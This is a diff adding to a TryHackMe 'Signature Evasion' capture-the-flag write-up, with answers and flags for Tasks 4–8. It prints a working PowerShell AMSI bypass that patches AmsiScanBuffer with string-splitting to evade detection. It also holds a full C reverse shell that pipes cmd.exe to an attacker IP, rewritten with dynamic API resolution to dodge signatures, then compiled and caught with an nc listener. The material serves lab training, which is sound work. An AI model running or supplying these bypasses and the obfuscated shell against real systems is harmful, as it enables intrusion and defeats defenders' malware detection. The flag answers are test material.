@@ -207,20 +207,411 @@ $A = "AmsiScanBuffer
 ```
 {: .nolineno }
 
-So we can fix it by applying what seen in previous room (Obfuscation principles <https://www.cyb3rm3.com/0bfu5cat10npr1nc1pl35>) like by splitting up the string.
+So we can fix it by applying what seen in previous room (Obfuscation principles <https://www.cyb3rm3.com/posts/THM-obfuscationprinciples/>) like by splitting up the string.
 
 After this, we can run again amsitrigger.exe and he'll stop on the line :
 
-
-
-
-
-## TASK 5 : Static Property-Based Signatures
-## TASK 6 : Behavioral Signatures
-## TASK 7 : Putting It All Together
-## TASK 8 : Conclusion 
-
-```console
-
+```powershell
+$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 
+[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
 ```
 {: .nolineno }
+
+We can use the splitting method again by filling the buffer variable $buf in multiple lines :
+
+```powershell
+$buf = New-Object bytes [] 6;
+$buf[0] = [UInt32]0xB8;
+$buf[1] = [UInt32]0x57;
+$buf[2] = [UInt32]0x00;
+$buf[3] = [UInt32]0x07;
+$buf[4] = [UInt32]0x80;
+$buf[5] = [UInt32]0xC3;
+```
+{: .nolineno }
+
+The final script become now :
+
+```powershell
+$MethodDefinition = "
+
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport(`"kernel32`")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport(`"kernel32`")]
+    public static extern strings GetString(string passobfsucation){return passobfsucation.toString()};
+";
+
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+$A = "Ams"+"iSca"+"nBu"+"ffer"
+$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
+[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
+[UInt32]$Size = 0x5;
+[UInt32]$ProtectFlag = 0x40;
+[UInt32]$OldProtectFlag = 0;
+[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
+$buf = New-Object bytes [] 6;
+$buf[0] = [UInt32]0xB8;
+$buf[1] = [UInt32]0x57;
+$buf[2] = [UInt32]0x00;
+$buf[3] = [UInt32]0x07;
+$buf[4] = [UInt32]0x80;
+$buf[5] = [UInt32]0xC3;
+[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
+```
+{: .nolineno }
+
+Running amsitrigger.exe on this one, does not trigger any alert anymore.
+
+Let's try to use  it in the challenge submit form :
+
+
+![Flag](/images/thm/signatureevasion/signatureevasion_2.png)
+_Flag_
+
+Answer : THM{70_D373C7_0r_70_N07_D373C7}
+
+## TASK 5 : Static Property-Based Signatures
+### Using CyberChef, obtain the Shannon entropy of the file: C:\Users\Student\Desktop\Binaries\shell.exe.
+Go to CyberChef in with the entropy recipe <https://gchq.github.io/CyberChef/#recipe=Entropy('Shannon%20scale')> the choose the file shell.exe :
+
+![Entropy](/images/thm/signatureevasion/signatureevasion_3.png)
+_Entropy_
+
+No Answer.
+
+### Rounded to three decimal places, what is the Shannon entropy of the file?
+
+Answer : 6.354
+
+## TASK 6 : Behavioral Signatures
+### What flag is found after uploading a properly obfuscated snippet? 
+
+The original C code is :
+
+```c
+#include <windows.h>
+#include <stdio.h>
+#include <lm.h>
+
+int main() {
+    printf("GetComputerNameA: 0x%p\\n", GetComputerNameA);
+    CHAR hostName[260];
+    DWORD hostNameLength = 260;
+    if (GetComputerNameA(hostName, &hostNameLength)) {
+        printf("hostname: %s\\n", hostName);
+    }
+}
+```
+{: .nolineno }
+
+The only call to obfuscate is the "GetComputerNameA()" function call. We can proceed as explain in the task and in the Windows documentation of the function. The previous code becomes :
+
+```c
+#include <windows.h>
+#include <stdio.h>
+#include <lm.h>
+
+typedef BOOL (WINAPI* myNotGetComputerNameA)(
+    LPSTR   lpBuffer,
+    LPDWORD nSize
+);
+
+int main() {
+    CHAR hostName[260];
+    DWORD hostNameLength = 260;
+    HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
+    myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, hostName);
+    if (notGetComputerNameA) {
+        printf("hostname: %s\\n", hostName);
+    }
+}
+```
+{: .nolineno }
+
+We can then compile this C code :
+
+```console
+root@ip-10-10-124-76:~/Desktop# x86_64-w64-mingw32-gcc test.c -o challenge-2.exe 
+root@ip-10-10-124-76:~/Desktop# ls
+'Additional Tools' mozo-made-15.desktop test.exe
+ challenge-2.exe test.c Tools
+```
+{: .nolineno }
+
+And finally, retreive the challenge-2.exe file on the windows machine (launch a "python3 -m http.server" command on the the attacker machine) and submit the file to get the flag :
+
+![Upload payload](/images/thm/signatureevasion/signatureevasion_4.png)
+_Upload payload_
+
+![Flag](/images/thm/signatureevasion/signatureevasion_5.png)
+_Flag_
+
+Answer : THM{N0_1MP0r75_F0r_Y0U}
+
+## TASK 7 : Putting It All Together
+### What is the flag found on the Administrator desktop? 
+We need to obfuscate the foolowing code :
+
+```c
+#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
+#include <stdio.h>
+
+#define DEFAULT_BUFLEN 1024
+
+void RunShell(char* C2Server, int C2Port) {
+        SOCKET mySocket;
+        struct sockaddr_in addr;
+        WSADATA version;
+        WSAStartup(MAKEWORD(2,2), &version);
+        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+        addr.sin_family = AF_INET;
+
+        addr.sin_addr.s_addr = inet_addr(C2Server);
+        addr.sin_port = htons(C2Port);
+
+        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
+            closesocket(mySocket);
+            WSACleanup();
+        } else {
+            printf("Connected to %s:%d\\n", C2Server, C2Port);
+
+            char Process[] = "cmd.exe";
+            STARTUPINFO sinfo;
+            PROCESS_INFORMATION pinfo;
+            memset(&sinfo, 0, sizeof(sinfo));
+            sinfo.cb = sizeof(sinfo);
+            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
+            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+
+            printf("Process Created %lu\\n", pinfo.dwProcessId);
+
+            WaitForSingleObject(pinfo.hProcess, INFINITE);
+            CloseHandle(pinfo.hProcess);
+            CloseHandle(pinfo.hThread);
+        }
+}
+
+int main(int argc, char **argv) {
+    if (argc == 3) {
+        int port  = atoi(argv[2]);
+        RunShell(argv[1], port);
+    }
+    else {
+        char host[] = "10.10.10.10";
+        int port = 53;
+        RunShell(host, port);
+    }
+    return 0;
+} 
+```
+{: .nolineno }
+
+From this code, we can see the API calls to change :
+
+```text
+WSAStartup
+WSAConnect
+WSACleanup
+WSASocketA
+WaitForSingleObject
+CloseHandle
+inet_addr
+htons
+```
+{: .nolineno }
+
+We can apply the method from task 6 for every API call. In example, for WSAStartup, it will be (with the help of Microsoft documentation) :
+
+```c
+// 1. Define the structure of the call
+int WSAStartup(
+        WORD      wVersionRequired,
+  [out] LPWSADATA lpWSAData
+);
+
+// Becomes :
+
+typedef int (WINAPI* myNotWSAStartup)(
+  WORD      wVersionRequired,
+  LPWSADATA lpWSAData
+);
+// 2. Obtain the handle of the module the call address is present in 
+HMODULE hWs2_32 = LoadLibraryW(L"Ws2_32.dll"); 
+```
+{: .nolineno }
+
+[Ws2_32.dll](/images/thm/signatureevasion/signatureevasion_6.png)
+_Ws2_32.dll_
+
+The LoadLibrary is different from task 6 because ANSI is not specified in the documentation for WSAStartup. We can suppose that the library will be loaded via Unicode strings and therfore, we will use : LoadLibraryW(L"XXXXX.dll").
+
+LoadLibraryA - Loads library via ANSI strings <https://stackoverflow.com/questions/30699776/whats-the-difference-between-these-windows-api-signatures-in-delphi>
+LoadLibraryW - Loads library via Unicode strings <https://stackoverflow.com/questions/30699776/whats-the-difference-between-these-windows-api-signatures-in-delphi>
+
+```c
+// 3. Obtain the process address of the call
+myNotWSAStartup notWSAStartup = (myNotWSAStartup) GetProcAddress(hWs2_32, "WSAStartup")
+```
+{: .nolineno }
+
+When this is done for every calls, we obtain the following structures definition, definition of pointers addresses and loading library :
+
+```c
+typedef int(WINAPI* myNotWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData);
+typedef SOCKET(WSAAPI* myNotWSASocketA)(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);
+typedef unsigned(WINAPI* myNotinet_addr)(const char *cp);
+typedef u_short(WINAPI* myNothtons)(u_short hostshort);
+typedef int(WSAAPI* myNotWSAConnect)(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
+typedef int(WINAPI* myNotclosesocket)(SOCKET s);
+typedef int(WINAPI* myNotWSACleanup)(void);
+
+HMODULE hWs2_32 = LoadLibraryW(L"Ws2_32.dll"); 
+myNotWSAStartup notWSAStartup = (myNotWSAStartup) GetProcAddress(hWs2_32, "WSAStartup");
+myNotWSASocketA notWSASocketA = (myNotWSASocketA) GetProcAddress(hWs2_32, "WSASocketA");
+myNotinet_addr notinet_addr = (myNotinet_addr) GetProcAddress(hWs2_32, "inet_addr");
+myNothtons nothtons = (myNothtons) GetProcAddress(hWs2_32, "htons");
+myNotWSAConnect notWSAConnect = (myNotWSAConnect) GetProcAddress(hWs2_32, "WSAConnect");
+myNotclosesocket notclosesocket= (myNotclosesocket) GetProcAddress(hWs2_32, "closesocket");
+myNotWSACleanup notWSACleanup = (myNotWSACleanup) GetProcAddress(hWs2_32, "WSACleanup");
+```
+{: .nolineno }
+
+The next step is to insert the structure definition before the function definition and the pointer address definition at the beginning of the RunShell function.
+
+We can now replace all API call by the pointer created. I.E : 
+
+```c
+WSAStartup(MAKEWORD(2,2), &version);
+```
+{: .nolineno }
+
+Becomes :
+
+```c
+notWSAStartup(MAKEWORD(2,2), &version);
+```
+{: .nolineno }
+
+The code now looks like  :
+
+```c
+#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
+#include <stdio.h>
+
+#define DEFAULT_BUFLEN 1024
+typedef int(WSAAPI* myNotWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData);
+typedef SOCKET(WSAAPI* myNotWSASocketA)(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);
+typedef unsigned(WSAAPI* myNotinet_addr)(const char *cp);
+typedef u_short(WSAAPI* myNothtons)(u_short hostshort);
+typedef int(WSAAPI* myNotWSAConnect)(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
+typedef int(WSAAPI* myNotclosesocket)(SOCKET s);
+typedef int(WSAAPI* myNotWSACleanup)(void);
+
+void RunShell(char* myip, int myport) {
+        
+        HMODULE hWs2_32 = LoadLibraryW(L"Ws2_32.dll"); 
+        myNotWSAStartup notWSAStartup = (myNotWSAStartup) GetProcAddress(hWs2_32, "WSAStartup");
+        myNotWSASocketA notWSASocketA = (myNotWSASocketA) GetProcAddress(hWs2_32, "WSASocketA");
+        myNotinet_addr notinet_addr = (myNotinet_addr) GetProcAddress(hWs2_32, "inet_addr");
+        myNothtons nothtons = (myNothtons) GetProcAddress(hWs2_32, "htons");
+        myNotWSAConnect notWSAConnect = (myNotWSAConnect) GetProcAddress(hWs2_32, "WSAConnect");
+        myNotclosesocket notclosesocket= (myNotclosesocket) GetProcAddress(hWs2_32, "closesocket");
+        myNotWSACleanup notWSACleanup = (myNotWSACleanup) GetProcAddress(hWs2_32, "WSACleanup");
+
+        SOCKET mySocket;
+        struct sockaddr_in addr;
+        WSADATA version;
+        notWSAStartup(MAKEWORD(2,2), &version);
+        mySocket = notWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+        addr.sin_family = AF_INET;
+
+        addr.sin_addr.s_addr = notinet_addr(myip);
+        addr.sin_port = nothtons(myport);
+
+        if (notWSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
+            notclosesocket(mySocket);
+            notWSACleanup();
+        } else {
+            printf("Connected to %s:%d\\n", myip, myport);
+
+            char Process[] = "cmd.exe";
+            STARTUPINFO sinfo;
+            PROCESS_INFORMATION pinfo;
+            memset(&sinfo, 0, sizeof(sinfo));
+            sinfo.cb = sizeof(sinfo);
+            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
+            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+
+            printf("Process Created %lu\\n", pinfo.dwProcessId);
+
+            WaitForSingleObject(pinfo.hProcess, INFINITE);
+            CloseHandle(pinfo.hProcess);
+            CloseHandle(pinfo.hThread);
+        }
+}
+
+int main(int argc, char **argv) {
+    if (argc == 3) {
+        int port  = atoi(argv[2]);
+        RunShell(argv[1], port);
+    }
+    else {
+        char host[] = "10.10.124.76";
+        int port = 5353;
+        RunShell(host, port);
+    }
+    return 0;
+}
+```
+{: .nolineno }
+
+Once done, we can compile this code :
+
+```console
+root@ip-10-10-124-76:~/Desktop# x86_64-w64-mingw32-gcc test.c -lwsock32 -lws2_32 -o challenge.exe
+root@ip-10-10-124-76:~/Desktop# ls
+'Additional Tools'   challenge.exe   mozo-made-15.desktop   old   test.c   Tools
+```
+{: .nolineno }
+
+and open a listener :
+
+```console
+root@ip-10-10-124-76:~/Desktop# nc -lnvp 5353
+Listening on [0.0.0.0] (family 0, port 5353)
+```
+{: .nolineno }
+
+Then sumbit the file :
+
+![Upload](/images/thm/signatureevasion/signatureevasion_7.png)
+_Upload_
+
+And we get back a reverse shell :
+
+![Reverse shell](/images/thm/signatureevasion/signatureevasion_8.png)
+_Reverse shell_
+
+We can now retreive the flag on the administrator's desktop :
+
+![Flag](/images/thm/signatureevasion/signatureevasion_9.png)
+_Flag_
+
+Answer : THM{08FU5C4710N_15 MY_10V3_14N6U463}
+
+## TASK 8 : Conclusion 
+### Read the above and continue learning! 
+No Answer.
